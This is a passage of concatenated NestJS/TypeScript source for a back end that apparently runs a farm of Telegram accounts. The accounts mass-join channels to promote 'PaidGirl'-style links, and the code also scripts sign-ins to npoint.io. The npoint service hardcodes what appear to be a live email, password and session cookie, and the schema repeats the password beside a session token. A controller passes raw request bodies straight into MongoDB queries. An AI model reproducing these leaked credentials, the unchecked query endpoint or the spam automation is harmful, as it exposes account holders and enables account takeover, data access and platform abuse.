@IsOptional()\r\n    @IsString()\r\n    dbcoll?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    channelLink?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    link?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Name of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    name?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\r\n    number?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Password of the client' })\r\n    @IsOptional()\r\n    @IsString()\r\n    password?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    repl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    promoteRepl?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    clientName?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsUrl({}, { message: 'Invalid URL format' })\r\n    deployKey?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Main account of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n    @IsOptional()\r\n    @IsString()\r\n    mainAccount?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.trim())\r\n    @IsOptional()\r\n    @IsString()\r\n    product?: string;\r\n\r\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\r\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\r\n    @IsOptional()\r\n    @IsArray()\r\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\r\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\r\n    promoteMobile?: string[];\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateClientDto } from './create-client.dto';\r\n\r\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: false, type: [String] })\n    promoteMobile: string[];\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\r\n    Controller,\r\n    Get,\r\n    Post,\r\n    Put,\r\n    Param,\r\n    Body,\r\n    HttpException,\r\n    HttpStatus,\r\n  } from '@nestjs/common';\r\n  import { NpointService } from './npoint.service';\r\n  import {\r\n    ApiTags,\r\n    ApiOperation,\r\n    ApiParam,\r\n    ApiBody,\r\n    ApiResponse,\r\n  } from '@nestjs/swagger';\r\n  \r\n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\r\n  @Controller('npoint')\r\n  export class NpointController {\r\n    constructor(private readonly npointService: NpointService) {}\r\n  \r\n    @Get('documents/:id')\r\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async fetchDocument(@Param('id') id: string) {\r\n      try {\r\n        return await this.npointService.fetchDocument(id);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  \r\n    @Post('documents')\r\n    @ApiOperation({ summary: 'Post a new document' })\r\n    @ApiBody({\r\n      description: 'The document to post',\r\n      schema: {\r\n        example: {\r\n          title: 'My Document',\r\n          content: 'This is the content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 201,\r\n      description: 'Document posted successfully',\r\n    })\r\n    @ApiResponse({ status: 400, description: 'Invalid input' })\r\n    async postDocument(@Body() document: any) {\r\n      try {\r\n        return await this.npointService.postDocument(document);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n      }\r\n    }\r\n\r\n    @Get('documents')\r\n    @ApiOperation({ summary: 'Fetch all documents' })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'List of all documents fetched successfully',\r\n    })\r\n    @ApiResponse({ status: 500, description: 'Internal server error' })\r\n    async fetchAllDocuments() {\r\n      try {\r\n        return await this.npointService.fetchAllDocuments();\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n      }\r\n    }  \r\n  \r\n    @Put('documents/:id')\r\n    @ApiOperation({ summary: 'Update a document by ID' })\r\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\r\n    @ApiBody({\r\n      description: 'The updated document',\r\n      schema: {\r\n        example: {\r\n          title: 'Updated Document',\r\n          content: 'This is the updated content of the document.',\r\n        },\r\n      },\r\n    })\r\n    @ApiResponse({\r\n      status: 200,\r\n      description: 'Document updated successfully',\r\n    })\r\n    @ApiResponse({ status: 404, description: 'Document not found' })\r\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\r\n      try {\r\n        return await this.npointService.updateDocument(id, updatedDocument);\r\n      } catch (error) {\r\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n      }\r\n    }\r\n  }","import { Module } from '@nestjs/common';\r\nimport { NpointService } from './npoint.service';\r\nimport { NpointController } from './npoint.controller';\r\n\r\n@Module({\r\n  controllers: [NpointController],\r\n  providers: [NpointService],\r\n  exports: [NpointService]\r\n})\r\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\r\nimport {  IsNumber, IsString } from 'class-validator';\r\n\r\nexport class CreatePromoteClientDto {\r\n  @ApiProperty({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsString()\r\n  readonly tgId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsString()\r\n  readonly mobile: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Date of the session',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly availableDate: string;\r\n\r\n  @ApiProperty({\r\n    description: 'lastActive identifier',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly lastActive: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels: number;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchPromoteClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the promoteClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\r\n\r\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\r\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\r\nimport { PromoteClient } from './schemas/promote-client.schema';\r\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\r\n\r\n@ApiTags('Promote Clients')\r\n@Controller('promoteclients')\r\nexport class PromoteClientController {\r\n  constructor(private readonly clientService: PromoteClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForPromoteClients')\r\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\r\n  async joinChannelsforPromoteClients(): Promise<string> {\r\n    return this.clientService.joinchannelForPromoteClients();\r\n  }\r\n\r\n  @Get('checkPromoteClients')\r\n  @ApiOperation({ summary: 'Check Promote Clients' })\r\n  async checkpromoteClients(): Promise<string> {\r\n    this.clientService.checkPromoteClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoPromoteClients')\r\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<PromoteClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsPromoteClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Promote Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n  async setAsPromoteClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsPromoteClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { PromoteClientService } from './promote-client.service';\r\nimport { PromoteClientController } from './promote-client.controller';\r\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => BufferClientModule),\r\n ],\r\n  controllers: [PromoteClientController],\r\n  providers: [PromoteClientService],\r\n  exports: [PromoteClientService]\r\n})\r\nexport class PromoteClientModule { }\r\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\n\n@Injectable()\nexport class PromoteClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) {}\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\");\n            this.clearJoinChannelInterval();\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n                await this.telegramService.disconnectAll();\n                await sleep(2000);\n                const clients = await this.promoteClientModel.find({ channels: { \"$lt\": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\n                            console.log(\"Started Joining for : \", document.mobile);\n                            const channels = await client.channelInfo(true);\n                            console.log(\"Existing Channels Length : \", channels.ids.length);\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            let result = [];\n                            if (channels.canSendFalseCount < 50) {\n                                if (channels.ids.length < 220) {\n                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                } else {\n                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                }\n                                this.joinChannelMap.set(document.mobile, result);\n                            } else {\n                                await client.leaveChannels(channels.canSendFalseChats);\n                            }\n                            await this.telegramService.deleteClient(document.mobile);\n                        } catch (error) {\n                            const parsedError = parseError(error);\n                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);\n                        }\n                    }\n\n                    this.joinChannelQueue();\n\n                }\n                console.log(\"Joining Channel Triggered Successfully for\", clients.length);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                console.error(\"Error during the joinchannelForPromoteClients process: \", error);\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            console.log(\"Ignored active check for promote channels as an active client setup exists\");\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels: \", channels.length);\n                            this.joinChannelMap.set(mobile, channels);\n\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join: \", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\n                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);\n                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);\n                                    this.removeFromPromoteMap(mobile);\n                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channelsInfo.ids.length });\n                                }\n                            } finally {\n                                await this.telegramService.deleteClient(mobile);\n                            }\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval();\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForPromoteClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const 